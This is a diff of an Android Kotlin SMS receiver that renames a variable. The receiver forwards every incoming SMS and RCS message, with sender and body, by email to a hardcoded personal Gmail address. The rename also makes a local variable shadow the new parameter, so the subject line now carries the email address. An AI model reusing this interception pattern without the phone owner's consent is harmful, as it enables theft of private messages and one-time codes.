@@ -37,7 +37,7 @@ class SMSReceiver : BroadcastReceiver() {
 
 
     override fun onReceive(context: Context, intent: Intent) {
-        val receiver = getPhoneNumber(context)
+        val recipient = getPhoneNumber(context)
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
             // Handle SMS messages
             val bundle = intent.extras
@@ -51,7 +51,7 @@ class SMSReceiver : BroadcastReceiver() {
                         val messageBody = smsMessage.messageBody
 
                         // Notify the listener that an SMS has been received
-                        onSmsReceived(context, sender, receiver, messageBody)
+                        onSmsReceived(context, sender, recipient, messageBody)
                     }
                 }
             }
@@ -62,21 +62,21 @@ class SMSReceiver : BroadcastReceiver() {
             val messageBody = intent.getStringExtra("message_body")
 
             // Notify the listener that an RCS message has been received
-            onSmsReceived(context, sender, receiver, messageBody)
+            onSmsReceived(context, sender, recipient, messageBody)
         }
     }
 
-    fun onSmsReceived(context: Context, sender: String?, receiver: String, messageBody: String?) {
+    fun onSmsReceived(context: Context, sender: String?, recipient: String, messageBody: String?) {
         if (sender != null && messageBody != null) {
             // Add the received SMS or RCS message to the RecyclerView
             if(Utils.isValidEmail(userEmail)) {
-                addSmsToRecyclerView(sender, receiver, messageBody)
+                addSmsToRecyclerView(sender, recipient, messageBody)
             }
 
             // Send email with the message content
             val emailSender = "khalid.smssender@mailsac.com" // Replace with your email address
             val recipient = "khalamoudi91@gmail.com"
-            val subject = "SMS from $sender to $receiver"
+            val subject = "SMS from $sender to $recipient"
             val body = "$messageBody"
 
             // Call the sendEmail function with all required arguments
@@ -89,8 +89,8 @@ class SMSReceiver : BroadcastReceiver() {
         }
     }
 
-    private fun addSmsToRecyclerView(sender: String, receiver: String, message: String) {
-        smsAdapter?.addSms(SmsData(sender, receiver, message))
+    private fun addSmsToRecyclerView(sender: String, recipient: String, message: String) {
+        smsAdapter?.addSms(SmsData(sender, recipient, message))
     }
 
 
